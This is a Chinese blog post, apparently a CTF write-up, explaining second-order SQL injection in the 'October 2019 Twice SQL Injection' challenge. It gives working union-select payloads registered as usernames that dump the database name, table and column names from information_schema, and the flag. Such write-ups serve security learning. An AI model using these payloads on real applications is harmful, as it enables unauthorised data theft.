---
title: October 2019 Twice SQL Injection
date: 2024-06-19 21:42:53
tags: 
    - 题解
    - sql注入
categories: 刷题笔记
---

### October 2019 Twice SQL Injection（二次注入）

日常注册登录一下，我们发现登录后有一个提交框

![image-20240620124825255](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406201248375.png)

我们试着写个sql语句

```
1' or 1=1#
```

![image-20240620124907542](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406201249572.png)

发现页面将 ' 进行了转义,并将语句打印在页面上

这个转义就导致页面存在了二次注入

### 二次注入的原理:

在第一次进行数据库插入数据的时候，使用了 addslashes 、get_magic_quotes_gpc、mysql_escape_string、 mysql_real_escape_string等函数对其中的特殊字符进行了转义，但是addslashes有一个特点就是虽然参数在过滤后会添加 “\” 进行转义，但是“\”并不会插入到数据库中，在写入数据库的时候还是保留了原来的数据。在将数据存入到了数据库中之后，开发者就认为数据是可信的。在下一次进行需要进行查询的时候，直接从数据库中取出了脏数据，没有进行进一步的检验和处理，这样就会造成SQL的二次注入。
比如在第一次插入数据的时候，数据中带有单引号，直接插入到了数据库中；然后在下一次使用中在拼凑的过程中，就形成了二次注入。



我们可以通过注册恶意用户名来登录，获取数据库内容

注册用户名为：1' union select database() #，密码为123的用户，进行登录

![image-20240620125455134](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406201254192.png)

得到了数据库名

```
ctftraining
```

我们接下来爆表

```
1' union select group_concat(table_name) from information_schema.tables where database()=table_schema#

123
```

![image-20240620125840180](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406201258211.png)

爆flag字段

```
1' union select group_concat(column_name) from information_schema.columns where 'flag'=table_name#

123
```

![image-20240620125944767](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406201259788.png)

爆flag

```
1' union select group_concat(flag) from flag#

123
```

![image-20240620130036683](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406201300711.png)
